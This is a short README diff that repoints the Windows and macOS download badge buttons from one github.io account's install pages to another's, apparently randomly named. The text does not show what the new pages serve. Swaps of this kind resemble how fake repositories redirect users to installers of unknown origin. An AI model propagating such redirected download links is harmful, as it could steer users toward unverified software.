@@ -64,7 +64,7 @@ That's it. Reverting is also one click.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://BursarHypnotize.github.io/install-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://TerminusAgentLine.github.io/windows-setup/)
 
 </div>
 
@@ -72,7 +72,7 @@ That's it. Reverting is also one click.
 
 <div align="center">
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://BursarHypnotize.github.io/install-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://TerminusAgentLine.github.io/macos-setup/)
 
 </div>
 
